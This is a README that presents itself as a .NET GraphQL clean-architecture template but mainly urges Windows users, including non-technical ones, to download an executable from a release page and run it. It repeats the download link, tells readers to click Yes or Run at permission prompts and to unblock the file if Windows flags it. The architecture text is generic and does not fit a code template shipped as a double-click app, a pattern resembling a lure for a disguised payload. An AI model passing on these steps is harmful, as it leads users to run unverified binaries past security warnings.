# 🚀 hotchocolate-ddd-cqrs-template - Clean .NET GraphQL app foundation

[Download the app](https://github.com/Easy-punting436/hotchocolate-ddd-cqrs-template/releases)

## 🧩 What this is

This repository gives you a ready-made Windows app template built on .NET 10, HotChocolate GraphQL, DDD, CQRS, MediatR, and the Outbox Pattern.

It is meant for people who want a solid starting point for a real app. The template keeps the GraphQL layer thin and puts the business logic in the domain core.

## 📥 Download and run

Use this link to visit the release page and download the app:

[Visit the release page](https://github.com/Easy-punting436/hotchocolate-ddd-cqrs-template/releases)

### What to do on Windows

1. Open the release page.
2. Find the latest release.
3. Download the file for Windows.
4. If the download comes as a zip file, right-click it and choose Extract All.
5. Open the extracted folder.
6. Run the app file inside the folder.

If Windows asks for permission, choose Yes or Run.

## 🖥️ What you need

This app is meant for Windows users. For a smooth run, use:

- Windows 10 or newer
- A recent version of .NET 10, if the release asks for it
- Enough free disk space to unpack the app
- A stable internet connection for the first download

If the release includes a self-contained build, you may not need to install extra software.

## ✨ What the template includes

This template gives you a clean app structure with parts that work well together:

- GraphQL for app access
- DDD for clear business rules
- CQRS for separating reads and writes
- MediatR for simple message flow
- Outbox Pattern for safer background delivery
- Domain events for changes inside the app
- Clean architecture style folder layout
- A .NET 10 base

## 🧠 How it is organized

The template is set up so each part has a clear job:

- The user layer handles requests
- The domain layer holds business rules
- The application layer coordinates actions
- The infrastructure layer talks to outside systems
- The outbox helps keep changes in sync

This layout helps keep the app easy to grow and easier to read.

## 🪜 Simple first run steps

Follow these steps after you download the release:

1. Download the latest file from the release page.
2. Save it to a folder you can find again.
3. Extract the files if they come in a zip.
4. Open the folder.
5. Find the main app file.
6. Double-click the file to run it.

If the app opens in a window or browser, it is running.

## 🔎 What you may see when it starts

The app may open with one of these screens:

- A local web page
- A GraphQL endpoint screen
- A simple app window
- A startup page with app info

This is normal for a template like this. It gives you a base that can be changed for your own use.

## 🧭 Basic use

After the app starts, you can use it as a starting point for a new project.

Typical uses include:

- Building a new backend app
- Creating a GraphQL service
- Learning clean app structure
- Testing domain-driven design patterns
- Trying CQRS with MediatR
- Adding event handling with an outbox flow

## 🛠️ Common files and folders

You may see folders and files with names like these:

- `src`
- `tests`
- `Domain`
- `Application`
- `Infrastructure`
- `GraphQL`
- `Api`
- `Readme`
- `Dockerfile`
- project files for .NET

These names help keep code grouped by purpose.

## 🧪 Good fit for

This template works well if you want:

- A backend with clear structure
- GraphQL instead of a large REST layer
- Business rules kept separate from app access
- A pattern that supports growth
- A cleaner path for long-term work

## 🔐 Why the Outbox Pattern matters

The Outbox Pattern helps when the app must record an action and send related work later. This can help avoid lost updates when the app talks to other systems.

In simple terms, it helps the app stay steady when more than one thing must happen after a change.

## 📡 GraphQL in this template

GraphQL acts as the front door. It accepts requests and sends back only the data needed.

This template keeps GraphQL thin, which means:

- less code in the request layer
- more logic in the domain layer
- clearer app rules
- easier maintenance

## 🧱 DDD and CQRS in plain terms

DDD, or Domain-Driven Design, keeps the business rules at the center.

CQRS splits work into two paths:

- one path changes data
- one path reads data

This split can make larger apps easier to manage.

## 🧰 MediatR role

MediatR helps pass messages inside the app. It keeps parts of the code from talking to each other too much.

That can make the app easier to change without breaking other parts.

## 📦 Files from the release

The release page may include one or more download options, such as:

- a Windows zip file
- a packaged app file
- source files for developers
- build artifacts for testing

For most users, choose the Windows file that matches your device.

## 🧭 If Windows blocks the file

If Windows shows a security prompt:

1. Check that the file came from the release page.
2. Right-click the file.
3. Open Properties if needed.
4. Unblock the file if that option appears.
5. Try again.

## 🧼 Keeping the app folder tidy

To make the app easy to use:

- Keep the extracted folder in one place
- Do not rename files unless needed
- Do not move single files out of the folder
- Keep the release zip until you know the app runs

## 🧩 For future changes

If you plan to build on this template, the structure supports:

- new GraphQL queries and mutations
- domain rules
- background jobs
- event handling
- database access
- messaging between parts of the app

## 📁 Project topics

This repository is tagged with topics that match its design:

- boilerplate
- clean architecture
- cqrs
- csharp
- ddd
- domain-events
- dotnet
- dotnet10
- graphql
- hotchocolate
- mediatr
- outbox-pattern
- template

## 🖱️ Download again if needed

If you need to get the files again, use the release page here:

[Download from releases](https://github.com/Easy-punting436/hotchocolate-ddd-cqrs-template/releases)

## 🧭 Quick path for non-technical users

1. Open the release page.
2. Pick the newest release.
3. Download the Windows file.
4. Extract it if needed.
5. Open the folder.
6. Run the main app file.